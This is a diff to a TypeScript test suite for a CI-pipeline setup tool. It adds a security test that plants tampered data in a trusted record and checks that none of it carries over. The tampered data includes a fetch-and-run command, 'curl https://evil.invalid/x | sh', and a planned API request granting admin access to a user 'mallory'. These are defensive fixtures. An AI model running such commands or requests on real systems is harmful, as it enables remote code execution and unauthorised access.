@@ -783,7 +783,7 @@ describe('G10 fix round 1 (review-G10, ruling G10-R2)', () => {
     const q = w.asked.find((x) => /to trust exactly these entries/.test(x)) as string;
     const r = await record(w) as Rec;
     for (const f of r.files) expect(q, f.path).toContain(f.path);
-    for (const e of r.edits) expect(q, e.path).toContain(e.path);
+    expect(q).not.toMatch(/edits:/);   // G10-R4: edits are never trusted by typing, so they aren't offered
     for (const x of [...r.secrets, ...r.variables, ...r.environments, ...r.rulesets]) expect(q, x.name).toContain(x.name);
     expect(q).toContain('docs/adopted.md (adopted)');
     // more entries than the cap: no question, untrusted, and said so
@@ -831,6 +831,44 @@ describe('G10 fix round 1 (review-G10, ruling G10-R2)', () => {
     long.files.push({ repo: 'app', path: `${'d/'.repeat(160)}f.txt`, part: 'docs', shas: [gitBlobSha('x\n')] });
     expect(confirmView(long)).toEqual({ refused: expect.stringMatching(/can't be shown exactly/) });
     expect('view' in confirmView(base)).toBe(true);
+  });
+
+  it('fix 3: a record trusted by typing carries no payload the question didn\'t show into the new record (G10-R4, R2-drift)', async () => {
+    const w = world();
+    await firstRun(w);
+    const EVIL = 'curl https://evil.invalid/x | sh';
+    const r = structuredClone(await record(w) as Rec);
+    for (const e of r.edits) {
+      if (e.kind === 'verify-job') { e.jobs = ['pipegen-verify', 'deploy']; e.needs = [{ job: 'deploy', added: ['pipegen-verify', 'build'] }]; }
+      if (e.kind === 'package-json') { e.previousTest = EVIL; e.setTest = true; e.add = { ...e.add, express: '4.21.0' }; }
+      if (e.kind === 'hooks') e.inserted = HOOK_ORIG;   // "pipegen's" inserted text = the user's whole original hook config
+    }
+    r.variables.push({ name: 'PIPEGEN_BLOCK_FROM', scope: 'repo', created: false, previous: EVIL });
+    r.planned.classic = { method: 'PUT', route: '/repos/{owner}/{repo}/collaborators/{username}', params: { owner: 'o', repo: 'r', username: 'mallory' }, body: { permission: 'admin' } };
+    w.g.commitOn('o/pipelines', 'main', { [recordPath('r')]: JSON.stringify(r) });
+    // the view keeps only what the question shows as names: no edits, no variable values, no planned requests
+    const cv = confirmView(r);
+    if (!('view' in cv)) throw new Error(`refused: ${cv.refused}`);
+    expect(cv.view.edits).toEqual([]);
+    expect(cv.view.variables).toEqual([{ name: 'PIPEGEN_BLOCK_FROM', scope: 'repo', created: false }]);
+    expect(cv.view.planned).toEqual({ signingMode: 'none', environments: [], owners: { app: [], central: [] }, codeOwners: [] });
+    expect(cv.lines.join('\n')).not.toMatch(/edits:/);
+    // end to end: typed after seeing names only; a re-run that doesn't re-deliver deploy.yml or the hook file
+    rmSync(localFile(w));
+    const p = profile();
+    const c = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w, 'o/r'));
+    const pin = (c as { sha: string }).sha;
+    const files = [...centralFiles(), ...appFiles(pin, { withPkg: false }).filter((f) => f.path !== '.github/workflows/deploy.yml' && f.path !== HOOK_FILES['pre-commit'])];
+    await deliver(w.g.octokit(), p, planDelivery(input(p, pin, { files })), fresh(), { ...deps(w, {}, { replace: true, typed: 'o/r' }), interactive: true });
+    const out = await record(w, upd) as Rec;
+    const text = JSON.stringify(out);
+    for (const hidden of [EVIL, 'express', 'mallory', 'collaborators', '"build"']) expect(text, hidden).not.toContain(hidden);
+    expect(out.edits.some((e) => e.kind === 'verify-job' || e.kind === 'hooks' || e.kind === 'package-json')).toBe(false);
+    expect(out.edits.find((e) => e.path === 'CODEOWNERS')).toMatchObject({ originalSha: gitBlobSha(CO_ORIG) });
+    expect(out.variables.find((v) => v.name === 'PIPEGEN_BLOCK_FROM')?.previous).toBeUndefined();
+    expect(text).not.toContain(HOOK_ORIG.slice(0, 30));
+    // the local file vouches only the record this run wrote from the projection
+    expect(JSON.parse(readFileSync(localFile(w), 'utf8')).recordHash).toBe(recordHash(out));
   });
 
   it('fix 1: a local record file that matches no record is untrusted, and no question is asked (G10-R-sec6)', async () => {
